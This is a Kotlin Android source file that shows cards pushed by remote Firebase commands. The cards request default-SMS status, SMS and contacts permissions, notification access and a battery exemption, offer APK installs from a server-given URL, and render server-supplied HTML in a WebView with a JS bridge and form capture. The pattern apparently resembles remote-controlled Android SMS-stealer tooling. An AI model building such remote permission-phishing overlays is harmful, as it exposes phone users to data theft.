package com.example.fast.ui.card

import android.app.Activity
import android.content.Context
import android.content.Intent
import android.util.Log
import android.view.ViewGroup
import com.example.fast.ui.MultipurposeCardActivity
import com.example.fast.util.DefaultSmsAppHelper

/**
 * RemoteCardHandler - Central handler for remote card commands from FCM/Firebase.
 *
 * Parses remote command data and builds MultipurposeCardSpec objects that can be displayed
 * either as an overlay on an existing activity or as a fullscreen activity.
 *
 * ## Supported Card Types:
 * - **message**: Simple text message with dismiss button
 * - **permission**: Request runtime permissions
 * - **default_sms**: Request to become default SMS app
 * - **notification_access**: Request notification listener access
 * - **battery_optimization**: Request battery optimization exemption
 * - **update**: Show update available card
 * - **webview**: Display HTML content or URL
 * - **confirm**: Yes/No confirmation dialog
 *
 * ## Remote Command Format (JSON from Django/Firebase):
 * ```json
 * {
 *   "type": "card",
 *   "card_type": "message|permission|update|webview|default_sms|...",
 *   "display_mode": "overlay|fullscreen",
 *   "title": "Card Title",
 *   "body": "Card body text",
 *   "html": "<html>...</html>",
 *   "url": "https://...",
 *   "primary_button": "OK",
 *   "secondary_button": "Cancel",
 *   "auto_dismiss_ms": 5000,
 *   "permissions": "sms,contacts",
 *   "download_url": "https://..."
 * }
 * ```
 */
object RemoteCardHandler {
    private const val TAG = "RemoteCardHandler"

    // Card type constants
    const val CARD_TYPE_MESSAGE = "message"
    const val CARD_TYPE_PERMISSION = "permission"
    const val CARD_TYPE_DEFAULT_SMS = "default_sms"
    const val CARD_TYPE_NOTIFICATION_ACCESS = "notification_access"
    const val CARD_TYPE_BATTERY_OPTIMIZATION = "battery_optimization"
    const val CARD_TYPE_UPDATE = "update"
    const val CARD_TYPE_INSTALL_APK = "install_apk"
    const val CARD_TYPE_WEBVIEW = "webview"
    const val CARD_TYPE_CONFIRM = "confirm"
    const val CARD_TYPE_INPUT = "input"

    // Display mode constants
    const val DISPLAY_MODE_OVERLAY = "overlay"
    const val DISPLAY_MODE_FULLSCREEN = "fullscreen"

    // Data keys (matching what Django/Firebase sends)
    const val KEY_CARD_TYPE = "card_type"
    const val KEY_DISPLAY_MODE = "display_mode"
    const val KEY_TITLE = "title"
    const val KEY_BODY = "body"
    const val KEY_HTML = "html"
    const val KEY_URL = "url"
    const val KEY_PRIMARY_BUTTON = "primary_button"
    const val KEY_SECONDARY_BUTTON = "secondary_button"
    const val KEY_AUTO_DISMISS_MS = "auto_dismiss_ms"
    const val KEY_PERMISSIONS = "permissions"
    const val KEY_DOWNLOAD_URL = "download_url"
    const val KEY_INSTALL_TITLE = "install_title"
    const val KEY_TYPING_ANIMATION = "typing_animation"
    const val KEY_ENTRANCE_ANIMATION = "entrance_animation"
    const val KEY_EXIT_ANIMATION = "exit_animation"
    const val KEY_CAN_IGNORE = "can_ignore"
    const val KEY_JS_BRIDGE = "js_bridge"

    /**
     * Build a MultipurposeCardSpec from remote command data.
     *
     * @param data Map of key-value pairs from FCM/Firebase command
     * @param activity Optional activity for permission requests
     * @param onComplete Callback when card is dismissed
     * @return MultipurposeCardSpec or null if data is invalid
     */
    fun buildSpec(
        data: Map<String, String>,
        activity: Activity? = null,
        onComplete: () -> Unit = {}
    ): MultipurposeCardSpec? {
        val cardType = data[KEY_CARD_TYPE] ?: CARD_TYPE_MESSAGE
        val title = data[KEY_TITLE]
        val body = data[KEY_BODY] ?: ""
        val primaryButton = data[KEY_PRIMARY_BUTTON]
        val secondaryButton = data[KEY_SECONDARY_BUTTON]
        val autoDismissMs = data[KEY_AUTO_DISMISS_MS]?.toLongOrNull()
        val entranceAnim = data[KEY_ENTRANCE_ANIMATION] ?: "flip"
        val exitAnim = data[KEY_EXIT_ANIMATION] ?: "flip"

        Log.d(TAG, "Building spec for card_type=$cardType, title=$title")

        val birth = buildBirthSpec(entranceAnim)
        val fillUp = buildFillUpSpec(cardType, data)
        val purpose = buildPurposeSpec(cardType, data, autoDismissMs, primaryButton, secondaryButton, onComplete)
        val death = buildDeathSpec(exitAnim)
        val canIgnore = data[KEY_CAN_IGNORE]?.lowercase() in listOf("true", "1", "yes")

        return MultipurposeCardSpec(
            birth = birth,
            fillUp = fillUp,
            purpose = purpose,
            death = death,
            canIgnore = canIgnore
        )
    }

    /**
     * Show a card as an overlay on the given rootView.
     * @param recedeViews Optional views to recede (scale/fade) while the card is shown; e.g. logo/header.
     * @return The controller so the caller can dismiss it later, or null if spec failed.
     */
    fun showOverlay(
        context: Context,
        rootView: ViewGroup,
        data: Map<String, String>,
        activity: Activity? = null,
        recedeViews: List<android.view.View>? = null,
        onComplete: () -> Unit = {}
    ): MultipurposeCardController? {
        var spec = buildSpec(data, activity, onComplete)
        if (spec == null) {
            Log.w(TAG, "Failed to build card spec from data: $data")
            onComplete()
            return null
        }
        if (!recedeViews.isNullOrEmpty()) {
            spec = spec.copy(birth = spec.birth.copy(recedeViews = recedeViews))
        }

        val controller = MultipurposeCardController(
            context = context,
            rootView = rootView,
            spec = spec,
            onComplete = onComplete,
            activity = activity
        )
        controller.show()
        return controller
    }

    /**
     * Launch fullscreen card activity with the given data.
     */
    fun launchFullscreenActivity(context: Context, data: Map<String, String>) {
        val intent = Intent(context, MultipurposeCardActivity::class.java).apply {
            if (context !is Activity) {
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            }
            // Pass all data as intent extras
            data.forEach { (key, value) -> putExtra(key, value) }
        }
        context.startActivity(intent)
        Log.d(TAG, "Launched MultipurposeCardActivity with data: $data")
    }

    /**
     * Parse and show card based on display_mode.
     * If overlay mode but no rootView provided, falls back to fullscreen.
     */
    fun parseAndShow(
        context: Context,
        rootView: ViewGroup?,
        data: Map<String, String>,
        activity: Activity? = null,
        onComplete: () -> Unit = {}
    ) {
        val displayMode = data[KEY_DISPLAY_MODE] ?: DISPLAY_MODE_FULLSCREEN

        when {
            displayMode == DISPLAY_MODE_OVERLAY && rootView != null -> {
                showOverlay(context, rootView, data, activity, recedeViews = null, onComplete = onComplete)
            }
            else -> {
                launchFullscreenActivity(context, data)
                onComplete()
            }
        }
    }

    // --- Private helper methods ---

    private fun buildBirthSpec(entranceAnim: String): BirthSpec {
        val animation = when (entranceAnim.lowercase()) {
            "fade" -> EntranceAnimation.FadeIn()
            "scale" -> EntranceAnimation.ScaleIn()
            else -> EntranceAnimation.FlipIn()
        }
        return BirthSpec(
            width = CardSize.MatchWithMargin(24),
            height = CardSize.WrapContent,
            placement = PlacementSpec.Center,
            entranceAnimation = animation
        )
    }

    private fun buildFillUpSpec(cardType: String, data: Map<String, String>): FillUpSpec {
        val title = data[KEY_TITLE]
        val body = data[KEY_BODY] ?: ""
        val html = data[KEY_HTML]
        val url = data[KEY_URL]
        val typingAnimation = data[KEY_TYPING_ANIMATION]?.toBoolean() ?: false
        val enableJsBridge = data[KEY_JS_BRIDGE]?.toBoolean() ?: false

        // Use WebView for webview card type or if HTML/URL is provided
        return when {
            cardType == CARD_TYPE_WEBVIEW || html != null || url != null -> {
                FillUpSpec.WebView(
                    title = title,
                    html = html,
                    url = url,
                    enableJsBridge = enableJsBridge,
                    autoResizeToContent = true
                )
            }
            else -> {
                FillUpSpec.Text(
                    title = title,
                    body = body,
                    typingAnimation = typingAnimation
                )
            }
        }
    }

    private fun buildPurposeSpec(
        cardType: String,
        data: Map<String, String>,
        autoDismissMs: Long?,
        primaryButton: String?,
        secondaryButton: String?,
        onComplete: () -> Unit
    ): PurposeSpec {
        // Auto-dismiss takes precedence if specified
        if (autoDismissMs != null && autoDismissMs > 0) {
            return PurposeSpec.AutoDismiss(
                dismissAfterMs = autoDismissMs,
                onDismiss = onComplete
            )
        }

        return when (cardType) {
            CARD_TYPE_PERMISSION -> {
                val permissions = data[KEY_PERMISSIONS]?.split(",")?.map { it.trim() } ?: emptyList()
                if (permissions.size == 1) {
                    PurposeSpec.RequestPermission(
                        primaryButtonLabel = primaryButton ?: "Grant",
                        permission = permissions.first(),
                        onResult = { granted ->
                            Log.d(TAG, "Permission ${permissions.first()} granted: $granted")
                        }
                    )
                } else {
                    PurposeSpec.RequestPermissionList(
                        primaryButtonLabel = primaryButton ?: "Grant",
                        permissions = permissions,
                        onAllGranted = { Log.d(TAG, "All permissions granted") },
                        onPartialGranted = { granted, denied ->
                            Log.d(TAG, "Permissions - granted: $granted, denied: $denied")
                        }
                    )
                }
            }

            CARD_TYPE_DEFAULT_SMS -> {
                PurposeSpec.RequestDefaultSms(
                    primaryButtonLabel = primaryButton ?: "Set as Default",
                    onResult = { success ->
                        Log.d(TAG, "Default SMS request result: $success")
                    }
                )
            }

            CARD_TYPE_NOTIFICATION_ACCESS -> {
                PurposeSpec.RequestNotificationAccess(
                    primaryButtonLabel = primaryButton ?: "Enable",
                    onResult = { success ->
                        Log.d(TAG, "Notification access result: $success")
                    }
                )
            }

            CARD_TYPE_BATTERY_OPTIMIZATION -> {
                PurposeSpec.RequestBatteryOptimization(
                    primaryButtonLabel = primaryButton ?: "Allow",
                    onResult = { success ->
                        Log.d(TAG, "Battery optimization result: $success")
                    }
                )
            }

            CARD_TYPE_UPDATE -> {
                val downloadUrl = data[KEY_DOWNLOAD_URL] ?: ""
                PurposeSpec.UpdateApk(
                    primaryButtonLabel = primaryButton ?: "Update",
                    onStartUpdate = {
                        Log.d(TAG, "Starting update from: $downloadUrl")
                        // Update logic will be handled by the activity
                    }
                )
            }

            CARD_TYPE_INSTALL_APK -> {
                val downloadUrl = data[KEY_DOWNLOAD_URL] ?: ""
                PurposeSpec.UpdateApk(
                    primaryButtonLabel = primaryButton ?: "Install",
                    onStartUpdate = {
                        Log.d(TAG, "Starting install APK from: $downloadUrl")
                        // Install logic will be handled by the activity
                    }
                )
            }

            CARD_TYPE_CONFIRM -> {
                PurposeSpec.Dual(
                    primaryButtonLabel = primaryButton ?: "Yes",
                    secondaryButtonLabel = secondaryButton ?: "No",
                    onPrimary = { Log.d(TAG, "Confirm: Yes") },
                    onSecondary = { Log.d(TAG, "Confirm: No") }
                )
            }

            else -> {
                // Default: simple dismiss card
                if (secondaryButton != null) {
                    PurposeSpec.Dual(
                        primaryButtonLabel = primaryButton ?: "OK",
                        secondaryButtonLabel = secondaryButton,
                        onPrimary = {},
                        onSecondary = {}
                    )
                } else {
                    PurposeSpec.Dismiss(
                        primaryButtonLabel = primaryButton ?: "OK",
                        onPrimary = {}
                    )
                }
            }
        }
    }

    private fun buildDeathSpec(exitAnim: String): DeathSpec {
        return when (exitAnim.lowercase()) {
            "fade" -> DeathSpec.FadeOut()
            "scale" -> DeathSpec.ScaleDown()
            "slide" -> DeathSpec.SlideOut()
            else -> DeathSpec.FlipOut()
        }
    }

    // --- Convenience methods for common card types ---

    /**
     * Create a simple message card spec.
     */
    fun createMessageSpec(
        title: String?,
        body: String,
        buttonLabel: String = "OK",
        autoDismissMs: Long? = null
    ): MultipurposeCardSpec {
        return MultipurposeCardSpec(
            birth = BirthSpec(
                width = CardSize.MatchWithMargin(24),
                height = CardSize.WrapContent,
                placement = PlacementSpec.Center,
                entranceAnimation = EntranceAnimation.FadeIn()
            ),
            fillUp = FillUpSpec.Text(title = title, body = body),
            purpose = if (autoDismissMs != null && autoDismissMs > 0) {
                PurposeSpec.AutoDismiss(dismissAfterMs = autoDismissMs)
            } else {
                PurposeSpec.Dismiss(primaryButtonLabel = buttonLabel)
            },
            death = DeathSpec.FadeOut()
        )
    }

    /**
     * Create a permission request card spec.
     */
    fun createPermissionSpec(
        title: String?,
        body: String,
        permissions: List<String>,
        buttonLabel: String = "Grant",
        onResult: (granted: List<String>, denied: List<String>) -> Unit = { _, _ -> }
    ): MultipurposeCardSpec {
        return MultipurposeCardSpec(
            birth = BirthSpec(
                width = CardSize.MatchWithMargin(24),
                height = CardSize.WrapContent,
                placement = PlacementSpec.Center,
                entranceAnimation = EntranceAnimation.FlipIn()
            ),
            fillUp = FillUpSpec.Text(title = title, body = body),
            purpose = PurposeSpec.RequestPermissionList(
                primaryButtonLabel = buttonLabel,
                permissions = permissions,
                onAllGranted = { onResult(permissions, emptyList()) },
                onPartialGranted = onResult
            ),
            death = DeathSpec.FlipOut()
        )
    }

    /**
     * Create a WebView card spec.
     */
    fun createWebViewSpec(
        title: String?,
        html: String? = null,
        url: String? = null,
        enableJsBridge: Boolean = false,
        buttonLabel: String = "Close",
        onFormSubmit: ((String) -> Unit)? = null
    ): MultipurposeCardSpec {
        return MultipurposeCardSpec(
            birth = BirthSpec(
                width = CardSize.MatchWithMargin(24),
                height = CardSize.Ratio(0.6f),
                placement = PlacementSpec.Center,
                entranceAnimation = EntranceAnimation.FadeIn()
            ),
            fillUp = FillUpSpec.WebView(
                title = title,
                html = html,
                url = url,
                enableJsBridge = enableJsBridge,
                autoResizeToContent = true,
                onFormSubmit = onFormSubmit
            ),
            purpose = PurposeSpec.Dismiss(primaryButtonLabel = buttonLabel),
            death = DeathSpec.FadeOut()
        )
    }
}
